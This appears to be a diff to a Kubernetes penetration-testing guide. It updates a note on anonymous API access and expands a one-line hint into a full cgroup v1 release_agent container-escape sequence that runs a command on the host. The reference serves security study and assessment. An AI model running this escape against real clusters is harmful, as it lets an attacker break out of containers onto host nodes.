@@ -28,7 +28,7 @@ Kubernetes clusters expose a large attack surface through their API server, kube
 - Service account tokens (mounted at `/var/run/secrets/kubernetes.io/serviceaccount/token`)
 - Client certificates (kubeconfig files, often found in CI/CD configs, home dirs, cloud storage)
 - OIDC tokens, webhook tokens, cloud provider IAM-to-K8s mappings (EKS IRSA, GKE Workload Identity)
-- Anonymous access (disabled by default since 1.6 but still found in the wild)
+- Anonymous access (enabled by default; unauthenticated requests become `system:anonymous` / `system:unauthenticated`, with only explicitly bound RBAC permissions such as public discovery/info roles)
 
 ## Key Vulnerabilities
 
@@ -79,8 +79,13 @@ cat /proc/1/status | grep -i cap
 ls /proc/*/cmdline 2>/dev/null | head -20
 # Check for mounted sockets
 ls -la /var/run/docker.sock /run/containerd/containerd.sock 2>/dev/null
-# cgroup escape (privileged + CAP_SYS_ADMIN)
-mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && echo 1 > /tmp/cgrp/notify_on_release
+# cgroup v1 release_agent escape (privileged + CAP_SYS_ADMIN)
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /etc/mtab)
+echo "$host_path/exploit.sh" > /tmp/cgrp/release_agent
+echo '#!/bin/sh' > /exploit.sh && echo "ps aux > $host_path/out" >> /exploit.sh && chmod +x /exploit.sh
+sh -c 'echo $$ > /tmp/cgrp/x/cgroup.procs'
 ```
 
 ### Network Policy Gaps
